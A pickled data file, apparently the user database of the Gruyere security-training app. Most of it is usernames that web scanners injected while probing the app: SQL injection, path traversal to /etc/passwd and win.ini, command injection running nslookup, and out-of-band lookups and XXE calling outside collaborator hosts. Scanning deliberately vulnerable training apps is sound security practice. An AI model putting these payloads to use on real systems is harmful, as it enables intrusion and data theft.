ssS'ghovjnjv\nbcc:074625.12-411.12.0b9d9.19393.2@bxss.me'
p2652
(dp2653
g10
S'True'
p2654
sg12
g2652
sg13
S'u]H[ww6KrA9F.x-F'
p2655
ssS'..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini'
p2656
(dp2657
g4
S'True'
p2658
sg6
g2656
sg7
S'g8S!c8l!X0'
p2659
ssS'-1 OR 2+348-348-1=0+0+0+1'
p2660
(dp2661
g10
S'True'
p2662
sg12
g2660
sg13
S'u]H[ww6KrA9F.x-F'
p2663
ssS'/etc/passwd'
p2664
(dp2665
g10
S'True'
p2666
sg12
g2664
sg13
NssS'/../../../../../../../WEB-INF/web.xml\x00.js'
p2667
(dp2668
g4
S'True'
p2669
sg6
g2667
sg7
S'1'
ssS"9mzwYZKO')) OR 685=(SELECT 685 FROM PG_SLEEP(15))--"
p2670
(dp2671
g10
S'True'
p2672
sg12
g2670
sg13
S'u]H[ww6KrA9F.x-F'
p2673
ssS'./saveprofile'
p2674
(dp2675
g4
S'True'
p2676
sg6
g2674
sg7
S'g8S!c8l!X0'
p2677
ssS"YCgruyjE'("
p2678
(dp2679
g10
S'True'
p2680
sg12
g2678
sg13
NssS"YCgruyjE / case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end "
p2681
(dp2682
g10
S'True'
p2683
sg12
g2681
sg13
NssS'file:///etc/hosts'
p2684
(dp2685
g4
S'True'
p2686
sg6
g2684
sg7
S'1'
ssS"'.print(md5(31337)).'"
p2687
(dp2688
g10
S'True'
p2689
sg12
g2687
sg13
S'u]H[ww6KrA9F.x-F'
p2690
ssS"'.gethostbyname(lc('hitch'.'vypvpgqo2a54f.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(113).chr(66).chr(122).chr(76).'"
p2691
(dp2692
g10
S'True'
p2693
sg12
g2691
sg13
S'u]H[ww6KrA9F.x-F'
p2694
ssS'case randomblob(1000000) when not null then 1 else 1 end '
p2695
(dp2696
g10
S'True'
p2697
sg12
g2695
sg13
NssS"vjYTjpqN' and '2072'='2072"
p2698
(dp2699
g4
S'True'
p2700
sg6
g2698
sg7
S'g8S!c8l!X0'
p2701
ssS'`uname`'
p2702
(dp2703
g4
S'True'
p2704
sg6
g2702
sg7
S'1'
ssS'YCgruyjE'
p2705
(dp2706
g10
S'True'
p2707
sg12
g2705
sg13
NssS'saveprofile'
p2708
(dp2709
g10
S'True'
p2710
sg12
g2708
sg13
S'u]H[ww6KrA9F.x-F'
p2711
ssS'\'"()'
p2712
(dp2713
g10
S'True'
p2714
sg12
g2712
sg13
S'u]H[ww6KrA9F.x-F'
p2715
ssS'bRxNsIAu..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini'
p2716
(dp2717
g4
S'True'
p2718
sg6
g2716
sg7
S'g8S!c8l!X0'
p2719
ssS'${10000285+10000459}'
p2720
(dp2721
g10
S'True'
p2722
sg12
g2720
sg13
S'u]H[ww6KrA9F.x-F'
p2723
ssS"YCgruyjE' / sleep(15) / '"
p2724
(dp2725
g10
S'True'
p2726
sg12
g2724
sg13
NssS'".gethostbyname(lc("hitrr"."zeaylgth2b151.bxss.me."))."A".chr(67).chr(hex("58")).chr(109).chr(85).chr(108).chr(74)."'
p2727
(dp2728
g10
S'True'
p2729
sg12
g2727
sg13
S'u]H[ww6KrA9F.x-F'
p2730
ssS"vjYTjpqN' and 5953=5953-- "
p2731
(dp2732
g4
S'True'
p2733
sg6
g2731
sg7
S'g8S!c8l!X0'
p2734
ssS'vjYTjpqN>\r\nBCC:d1frlrbx54b65ss0g8q1pdjrlirbf25qxklb82wr@oastify.com\r\nvah: y'
p2735
(dp2736
g4
S'True'
p2737
sg6
g2735
sg7
S'g8S!c8l!X0'
p2738
ssS'thishouldnotexistandhopefullyitwillnot'
p2739
(dp2740
g10
S'True'
p2741
sg12
g2739
sg13
NssS'/../../../../../WEB-INF/web.xml'
p2742
(dp2743
g4
S'True'
p2744
sg6
g2742
sg7
S'1'
ssS'&nslookup hitpatoskwxrtdc554.bxss.me&\'\\"`0&nslookup hitpatoskwxrtdc554.bxss.me&`\''
p2745
(dp2746
g10
S'True'
p2747
sg12
g2745
sg13
S'u]H[ww6KrA9F.x-F'
p2748
ssS'\'; select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = \'SYSTEM_COLUMNS\' and COLUMN_NAME = \'TABLE_NAME\' -- '
p2749
(dp2750
g10
S'True'
p2751
sg12
g2749
sg13
NssS"vjYTjpqN' and '6314'='6314'"
p2752
(dp2753
g4
S'True'
p2754
sg6
g2752
sg7
S'g8S!c8l!X0'
p2755
ssS'YCgruyjE" UNION ALL select NULL -- '
p2756
(dp2757
g10
S'True'
p2758
sg12
g2756
sg13
NssS'/../../../../WEB-INF/web.xml\x00.js'
p2759
(dp2760
g4
S'True'
p2761
sg6
g2759
sg7
S'1'
ssS'..././..././..././..././..././..././..././..././..././..././etc/passwd'
p2762
(dp2763
g4
S'True'
p2764
sg6
g2762
sg7
S'g8S!c8l!X0'
p2765
ssS'bRxNsIAu../../../../../../../../../../../../../../../../winnt/win.ini'
p2766
(dp2767
g4
S'True'
p2768
sg6
g2766
sg7
S'g8S!c8l!X0'
p2769
ssS"vjYTjpqN'+eval(compile('for x in range(1):\\n import time\\n time.sleep(20)','a','single'))+'"
p2770
(dp2771
g4
S'True'
p2772
sg6
g2770
sg7
S'g8S!c8l!X0'
p2773
ssS'bRxNsIAu../../../../../../../../../../../../../../../../windows/win.ini'
p2774
(dp2775
g4
S'True'
p2776
sg6
g2774
sg7
S'g8S!c8l!X0'
p2777
ssS'../../../../../../../../../../../../../../../../etc/passwd'
p2778
(dp2779
g10
S'True'
p2780
sg12
g2778
sg13
NssS'echo tzxzoq$()\\ ewgvur\\nz^xyu||a #\' &echo tzxzoq$()\\ ewgvur\\nz^xyu||a #|" &echo tzxzoq$()\\ ewgvur\\nz^xyu||a #'
p2781
(dp2782
g10
S'True'
p2783
sg12
g2781
sg13
S'u]H[ww6KrA9F.x-F'
p2784
ssS'1-0'
p2785
(dp2786
g4
S'True'
p2787
sg6
g2785
sg7
S'1'
ssS'vjYTjpqNw4t7fhazhk\\\\lcn4vl1r7p'
p2788
(dp2789
g4
S'True'
p2790
sg6
g2788
sg7
S'g8S!c8l!X0'
p2791
ssS'c:\\windows\\win.ini\x00bRxNsIAu'
p2792
(dp2793
g4
S'True'
p2794
sg6
g2792
sg7
S'g8S!c8l!X0'
p2795
ssS'/../../../WEB-INF/web.xml\x00.js'
p2796
(dp2797
g4
S'True'
p2798
sg6
g2796
sg7
S'1'
ssS'file:%2F%2F%2Fboot.ini'
p2799
(dp2800
g4
S'True'
p2801
sg6
g2799
sg7
S'1'
ssS'ghovjnjv9235367'
p2802
(dp2803
g10
S'True'
p2804
sg12
g2802
sg13
S'u]H[ww6KrA9F.x-F'
p2805
ssS'..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini'
p2806
(dp2807
g4
S'True'
p2808
sg6
g2806
sg7
S'g8S!c8l!X0'
p2809
ssS"vjYTjpqN');declare @q varchar(99);set @q='\\\\7qylal0ruy00umhu52fve78lacg54wukld94wvkk.oasti'+'fy.com\\bbj'; exec master.dbo.xp_dirtree @q;-- "
p2810
(dp2811
g4
S'True'
p2812
sg6
g2810
sg7
S'g8S!c8l!X0'
p2813
ssS'sardo'
p2814
(dp2815
g299
S'I hate my brother Romano.'
p2816
sg301
S'Miss Sardo'
p2817
sg365
S'red'
p2818
sg303
S'https://www.google.com/search?q="pecorino+sardo"'
p2819
sg305
I00
sg306
I01
sg368
(lp2820
sg307
S'odras'
p2821
ssS"ghovjnjv'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'"
p2822
(dp2823
g10
S'True'
p2824
sg12
g2822
sg13
S'u]H[ww6KrA9F.x-F'
p2825
ssS'cheddar'
p2826
(dp2827
g299
S'My SSN is <a href="https://www.google.com/search?q=078-05-1120">078-05-1120</a>.'
p2828
sg301
S'Cheddar Mac'
p2829
sg365
S'blue'
p2830
sg303
S'https://images.google.com/?q=cheddar+cheese'
p2831
sg305
I00
sg306
I01
sg368
(lp2832
S'Gruyere is the cheesiest application on the web.'
p2833
aS'I wonder if there are any security holes in this....'
p2834
asg307
S'orange'
p2835
ssS'${@print(md5(31337))}'
p2836
(dp2837
g10
S'True'
p2838
sg12
g2836
sg13
S'u]H[ww6KrA9F.x-F'
p2839
ssS'http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg'
p2840
(dp2841
g10
S'True'
p2842
sg12
g2840
sg13
S'u]H[ww6KrA9F.x-F'
p2843
ssS'-1 OR 3+348-348-1=0+0+0+1'
p2844
(dp2845
g10
S'True'
p2846
sg12
g2844
sg13
S'u]H[ww6KrA9F.x-F'
p2847
ssS'bRxNsIAu../../../../../../../../../../../../../../../../etc/passwd'
p2848
(dp2849
g4
S'True'
p2850
sg6
g2848
sg7
S'g8S!c8l!X0'
p2851
ssS'$(nslookup hitvuckghrkkc254bf.bxss.me||perl -e "gethostbyname(\'hitvuckghrkkc254bf.bxss.me\')")'
p2852
(dp2853
g10
S'True'
p2854
sg12
g2852
sg13
S'u]H[ww6KrA9F.x-F'
p2855
ssS'vjYTjpqN"|echo 1fkyqgp76w 6wz1iwyutn ||'
p2856
(dp2857
g4
S'True'
p2858
sg6
g2856
sg7
S'g8S!c8l!X0'
p2859
ssS'/../../../../../../../../WEB-INF/web.xml'
p2860
(dp2861
g4
S'True'
p2862
sg6
g2860
sg7
S'1'
ssS'vjYTjpqNa0j530yjv9'
p2863
(dp2864
g4
S'True'
p2865
sg6
g2863
sg7
S'g8S!c8l!X0'
p2866
ssS"vjYTjpqN'|ping -c 21 127.0.0.1 #"
p2867
(dp2868
g4
S'True'
p2869
sg6
g2867
sg7
S'g8S!c8l!X0'
p2870
ssS'/../../../../../../../../../etc/passwd\x00.js'
p2871
(dp2872
g4
S'True'
p2873
sg6
g2871
sg7
S'1'
ssS"YCgruyjE' and 0 in (select sleep(15) ) -- "
p2874
(dp2875
g10
S'True'
p2876
sg12
g2874
sg13
NssS'../../../../../../../../../../../../../../../../etc/passwd\x00bRxNsIAu'
p2877
(dp2878
g4
S'True'
p2879
sg6
g2877
sg7
S'g8S!c8l!X0'
p2880
ssS'file:%2F%2F%2Fetc%2Fpasswd'
p2881
(dp2882
g4
S'True'
p2883
sg6
g2881
sg7
S'1'
ssS'https://3578541350414011388%2eowasp%2eorg'
p2884
(dp2885
g10
S'True'
p2886
sg12
g2884
sg13
NssS'\'"()&%<zzz><ScRiPt >JmvH(9487)</ScRiPt>'
p2887
(dp2888
g10
S'True'
p2889
sg12
g2887
sg13
S'u]H[ww6KrA9F.x-F'
p2890
ssS'fcjx6${file.separator}rck3q'
p2891
(dp2892
g4
S'True'
p2893
sg6
g2891
sg7
S'g8S!c8l!X0'
p2894
ssS'vjYTjpqN{${sleep(20)}}'
p2895
(dp2896
g4
S'True'
p2897
sg6
g2895
sg7
S'g8S!c8l!X0'
p2898
ssS'1 0 0 - -'
p2899
(dp2900
g4
S'True'
p2901
sg6
g2899
sg7
S'1'
ssS'http://www.google.com:80/search?q=OWASP%20ZAP'
p2902
(dp2903
g10
S'True'
p2904
sg12
g2902
sg13
NssS'http://skipfish.invalid/;?'
p2905
(dp2906
g4
S'True'
p2907
sg6
g2905
sg7
S'1'
ssS'/../WEB-INF/web.xml'
p2908
(dp2909
g4
S'True'
p2910
sg6
g2908
sg7
S'1'
ssS'if(now()=sysdate(),sleep(15),0)'
p2911
(dp2912
g10
S'True'
p2913
sg12
g2911
sg13
S'u]H[ww6KrA9F.x-F'
p2914
ssS'1rF79kBrO'
p2915
(dp2916
g10
S'True'
p2917
sg12
g2915
sg13
S'u]H[ww6KrA9F.x-F'
p2918
ssS'/'
(dp2919
g10
S'True'
p2920
sg12
S'/'
sg13
NssS"vjYTjpqN17175837' or '8216'='8219"
p2921
(dp2922
g4
S'True'
p2923
sg6
g2921
sg7
S'g8S!c8l!X0'
p2924
ssS'(nslookup hitmietrgfwtudc187.bxss.me||perl -e "gethostbyname(\'hitmietrgfwtudc187.bxss.me\')")'
p2925
(dp2926
g10
S'True'
p2927
sg12
g2925
sg13
S'u]H[ww6KrA9F.x-F'
p2928
ssS'vjYTjpqN+(select*from(select(sleep(20)))a)+'
p2929
(dp2930
g4
S'True'
p2931
sg6
g2929
sg7
S'g8S!c8l!X0'
p2932
ssS'vjYTjpqN\'||(select extractvalue(xmltype(\'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jqiei SYSTEM "http://pun3e349yg4iy4lc9kjdipc3eukn8ey22qtdk19.oasti\'||\'fy.com/">%jqiei;]>\'),\'/l\') from dual)||\''
p2933
(dp2934
g4
S'True'
p2935
sg6
g2933
sg7
S'g8S!c8l!X0'
p2936
ssS"ghovjnjv%' AND 2*3*8=6*8 AND 'qvXX'!='qvXX%"
p2937
(dp2938
g10
S'True'
p2939
sg12
g2937
sg13
S'u]H[ww6KrA9F.x-F'
p2940
ssS"vjYTjpqN'+(select load_file('\\\\\\\\g0hukua047a94vr3fbp4ogiuklqee54tvwjn6eu3.oastify.com\\\\hrz'))+'"
p2941
(dp2942
g4
S'True'
p2943
sg6
g2941
sg7
S'g8S!c8l!X0'
p2944
ssS"YCgruyjE' AND '1'='1' -- "
p2945
(dp2946
g10
S'True'
p2947
sg12
g2945
sg13
NssS'.../saveprofile'
p2948
(dp2949
g4
S'True'
p2950
sg6
g2948
sg7
S'g8S!c8l!X0'
p2951
ssS'.../bRxNsIAu'
p2952
(dp2953
g4
S'True'
p2954
sg6
g2952
sg7
S'g8S!c8l!X0'
p2955
ssS'http://\\3578541350414011388.owasp.org'
p2956
(dp2957
g10
S'True'
p2958
sg12
g2956
sg13
NssS'sfish>\'>"></sfish><sfish>'
p2959
(dp2960
g4
S'True'
p2961
sg6
g2959
sg7
S'1'
ssS'*)(objectClass=*'
p2962
(dp2963
g4
S'True'
p2964
sg6
g2962
sg7
S'g8S!c8l!X0'
p2965
ssS"Ktv69EpC' OR 815=(SELECT 815 FROM PG_SLEEP(15))--"
p2966
(dp2967
g10
S'True'
p2968
sg12
g2966
sg13
S'u]H[ww6KrA9F.x-F'
p2969
ssS'UAcZPRyn'
p2970
(dp2971
g4
S'True'
p2972
sg6
g2970
sg7
S'q8F!i6z!A7'
p2973
ssS'1"`uname`"'
p2974
(dp2975
g4
S'True'
p2976
sg6
g2974
sg7
S'1'
ssS"vjYTjpqN' and '6670'='6675"
p2977
(dp2978
g4
S'True'
p2979
sg6
g2977
sg7
S'g8S!c8l!X0'
p2980
ssS'ep16a${845*325}w8hf9'
p2981
(dp2982
g4
S'True'
p2983
sg6
g2981
sg7
S'g8S!c8l!X0'
p2984
ssS'(select extractvalue(xmltype(\'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jqiei SYSTEM "http://syu6i68c2j8l27pfdnngmsg6ixoqch255twgn4c.oasti\'||\'fy.com/">%jqiei;]>\'),\'/l\') from dual)'
p2985
(dp2986
g4
S'True'
p2987
sg6
g2985
sg7
S'g8S!c8l!X0'
p2988
ssS'duzya%{587*268}oms9t'
p2989
(dp2990
g4
S'True'
p2991
sg6
g2989
sg7
S'g8S!c8l!X0'
p2992
ssS'vjYTjpqNzmlsnzjkyp%41gdmj8qkq9v'
p2993
(dp2994
g4
S'True'
p2995
sg6
g2993
sg7
S'g8S!c8l!X0'
p2996
ssS'//skipfish.invalid/;?'
p2997
(dp2998
g4
S'True'
p2999
sg6
g2997
sg7
S'1'
ssS'<xdk xmlns="http://a.b/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://a.b/ http://akyo4ouuo1u3opbxz59y8a2o4fa8yzonobfy6mv.oastify.com/xdk.xsd">xdk</xdk>'
p3000
(dp3001
g4
S'True'
p3002
sg6
g3000
sg7
S'g8S!c8l!X0'
p3003
ssS'case randomblob(1000000000) when not null then 1 else 1 end '
p3004
(dp3005
g10
S'True'
p3006
sg12
g3004
sg13
NssS'<!--#EXEC cmd="dir \\"-->'
p3007
(dp3008
g10
S'True'
p3009
sg12
g3007
sg13
NssS'0W45pz4p'
p3010
(dp3011
g10
S'True'
p3012
sg12
g3010
sg13
NssS'/../WEB-INF/web.xml\x00.js'
p3013
(dp3014
g4
S'True'
p3015
sg6
g3013
sg7
S'1'
ssS"'+'A'.concat(70-3).concat(22*4).concat(116).concat(81).concat(116).concat(71)+(require'socket'\nSocket.gethostbyname('hitgp'+'sfmmzwffd5c83.bxss.me.')[3].to_s)+'"
p3016
(dp3017
g10
S'True'
p3018
sg12
g3016
sg13
S'u]H[ww6KrA9F.x-F'
p3019
ssS"vjYTjpqN51193435' or '4442'='4442"
p3020
(dp3021
g4
S'True'
p3022
sg6
g3020
sg7
S'g8S!c8l!X0'
p3023
ssS'http://www.google.com/humans.txt#foo='
p3024
(dp3025
g4
S'True'
p3026
sg6
g3024
sg7
S'1'
ssS"YCgruyjE') UNION ALL select NULL -- "
p3027
(dp3028
g10
S'True'
p3029
sg12
g3027
sg13
NssS'0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z'
p3030
(dp3031
g10
S'True'
p3032
sg12
g3030
sg13
S'u]H[ww6KrA9F.x-F'
p3033
ssS'.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\windows/win.ini'
p3034
(dp3035
g4
S'True'
p3036
sg6
g3034
sg7
S'g8S!c8l!X0'
p3037
ssS'response.write(9482720*9918357)'
p3038
(dp3039
g10
S'True'
p3040
sg12
g3038
sg13
S'u]H[ww6KrA9F.x-F'
p3041
ssS"ghovjnjv'&&sleep(27*1000)*axvuav&&'"
p3042
(dp3043
g10
S'True'
p3044
sg12
g3042
sg13
S'u]H[ww6KrA9F.x-F'
p3045
ssS'case randomblob(10000000) when not null then 1 else 1 end '
p3046
(dp3047
g10
S'True'
p3048
sg12
g3046
sg13
NssS'javascript:/*</script><img/onerror=\'-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/5v1jfj5pzw5yzkmsa0ktj5djfal39uzir9f02rqgX;.oastify.com/).replace(/.;/g,[])]//\'src=>'
p3049
(dp3050
g4
S'True'
p3051
sg6
g3049
sg7
S't2O!f7q!O7'
p3052
ssS"1'`true`'"
p3053
(dp3054
g4
S'True'
p3055
sg6
g3053
sg7
S'1'
ssS'%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini'
p3056
(dp3057
g4
S'True'
p3058
sg6
g3056
sg7
S'g8S!c8l!X0'
p3059
ssS'case randomblob(100000) when not null then 1 else 1 end '
p3060
(dp3061
g10
S'True'
p3062
sg12
g3060
sg13
NssS'1"`true`"'
p3063
(dp3064
g4
S'True'
p3065
sg6
g3063
sg7
S'1'
ssS'1\'"'
p3066
(dp3067
g10
S'True'
p3068
sg12
g3066
sg13
S'u]H[ww6KrA9F.x-F'
p3069
ssS'HttP://bxss.me/t/xss.html?%00'
p3070
(dp3071
g10
S'True'
p3072
sg12
g3070
sg13
S'u]H[ww6KrA9F.x-F'
p3073
ssS'\'"'
p3074
(dp3075
g10
S'True'
p3076
sg12
g3074
sg13
S'u]H[ww6KrA9F.x-F'
p3077
ssS'YCgruyjE) UNION ALL select NULL -- '
p3078
(dp3079
g10
S'True'
p3080
sg12
g3078
sg13
NssS'YCgruyjE" AND "1"="1" -- '
p3081
(dp3082
g10
S'True'
p3083
sg12
g3081
sg13
NssS'YCgruyjE and 0 in (select sleep(15) ) -- '
p3084
(dp3085
g10
S'True'
p3086
sg12
g3084
sg13
NssS"'("
p3087
(dp3088
g10
S'True'
p3089
sg12
g3087
sg13
NssS'..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini\x00bRxNsIAu'
p3090
(dp3091
g4
S'True'
p3092
sg6
g3090
sg7
S'g8S!c8l!X0'
p3093
ssS'%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
p3094
(dp3095
g4
S'True'
p3096
sg6
g3094
sg7
S'g8S!c8l!X0'
p3097
ssS'/../../../../WEB-INF/web.xml'
p3098
(dp3099
g4
S'True'
p3100
sg6
g3098
sg7
S'1'
ssS'.\\1'
p3101
(dp3102
g4
S'True'
p3103
sg6
g3101
sg7
S'1'
ssS'&echo hnbteq$()\\ bunjhl\\nz^xyu||a #\' &echo hnbteq$()\\ bunjhl\\nz^xyu||a #|" &echo hnbteq$()\\ bunjhl\\nz^xyu||a #'
p3104
(dp3105
g10
S'True'
p3106
sg12
g3104
sg13
S'u]H[ww6KrA9F.x-F'
p3107
ssS'vjYTjpqNhj0st%>gp7ve\'/"<i39jt'
p3108
(dp3109
g4
S'True'
p3110
sg6
g3108
sg7
S'g8S!c8l!X0'
p3111
ssS"vjYTjpqN85065096' or '8520'='8520"
p3112
(dp3113
g4
S'True'
p3114
sg6
g3112
sg7
S'g8S!c8l!X0'
p3115
ssS'VdimdPLB'
p3116
(dp3117
g4
S'True'
p3118
sg6
g3116
sg7
S't2O!f7q!O7'
p3119
ssS'zApPX13sS'
p3120
(dp3121
g10
S'True'
p3122
sg12
g3120
sg13
NssS'12345\'"\\\'\\")'
p3123
(dp3124
g10
S'True'
p3125
sg12
g3123
sg13
S'u]H[ww6KrA9F.x-F'
p3126
ssS'...\\1'
p3127
(dp3128
g4
S'True'
p3129
sg6
g3127
sg7
S'1'
ssS'<!--'
p3130
(dp3131
g10
S'True'
p3132
sg12
g3130
sg13
S'u]H[ww6KrA9F.x-F'
p3133
ssS'YCgruyjE"'
p3134
(dp3135
g10
S'True'
p3136
sg12
g3134
sg13
NssS'vjYTjpqN,(select*from(select(sleep(20)))a)'
p3137
(dp3138
g4
S'True'
p3139
sg6
g3137
sg7
S'g8S!c8l!X0'
p3140
ssS"YCgruyjE'"
p3141
(dp3142
g10
S'True'
p3143
sg12
g3141
sg13
NssS"vjYTjpqN')waitfor delay'0:0:20'--"
p3144
(dp3145
g4
S'True'
p3146
sg6
g3144
sg7
S'g8S!c8l!X0'
p3147
ssS'\\windows\\win.ini'
p3148
(dp3149
g4
S'True'
p3150
sg6
g3148
sg7
S'g8S!c8l!X0'
p3151
ssS'..\\..\\..\\..\\..\\..\\..\\..\\boot.ini\x00.js'
p3152
(dp3153
g4
S'True'
p3154
sg6
g3152
sg7
S'1'
ssS"YCgruyjE' AND '1'='1"
p3155
(dp3156
g10
S'True'
p3157
sg12
g3155
sg13
NssS'"java.lang.Thread.sleep"(15000)'
p3158
(dp3159
g10
S'True'
p3160
sg12
g3158
sg13
NssS'YCgruyjE" / (SELECT  UTL_INADDR.get_host_name(\'10.0.0.1\') from dual union SELECT  UTL_INADDR.get_host_name(\'10.0.0.2\') from dual union SELECT  UTL_INADDR.get_host_name(\'10.0.0.3\') from dual union SELECT  UTL_INADDR.get_host_name(\'10.0.0.4\') from dual union SELECT  UTL_INADDR.get_host_name(\'10.0.0.5\') from dual) / "'
p3161
(dp3162
g10
S'True'
p3163
sg12
g3161
sg13
NssS'1`false`'
p3164
(dp3165
g4
S'True'
p3166
sg6
g3164
sg7
S'1'
ssS'YCgruyjE;'
p3167
(dp3168
g10
S'True'
p3169
sg12
g3167
sg13
NssS'meGsJZcO'
p3170
(dp3171
g4
S'True'
p3172
sg6
g3170
sg7
S'd3D!e4d!R4'
p3173
ss.